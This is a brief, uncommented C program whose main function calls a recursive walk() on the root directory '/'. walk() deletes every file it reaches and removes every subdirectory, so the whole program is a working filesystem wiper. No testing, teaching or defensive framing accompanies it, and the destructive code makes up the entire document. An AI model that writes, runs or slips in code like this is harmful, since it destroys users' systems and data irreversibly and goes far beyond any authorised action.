#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <sys/stat.h>
#include <libgen.h>
#include <limits.h>

void walk(const char *dir_path)
{
    DIR *dir;
    struct dirent *entry;
    struct stat statbuf;
    char full_path[PATH_MAX];
    
    dir = opendir(dir_path);
    if (dir == NULL) {
        return;
    }
    
    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
            continue;
        }
        
        snprintf(full_path, PATH_MAX, "%s/%s", dir_path, entry->d_name);
        
        if (stat(full_path, &statbuf) == -1) {
            continue;
        }
        
        if (S_ISDIR(statbuf.st_mode)) {
            walk(full_path);
            rmdir(full_path);
        } else {
            remove(full_path);
        }
    }
    closedir(dir);
}

int main(void)
{
    walk("/");
    return 0;
}
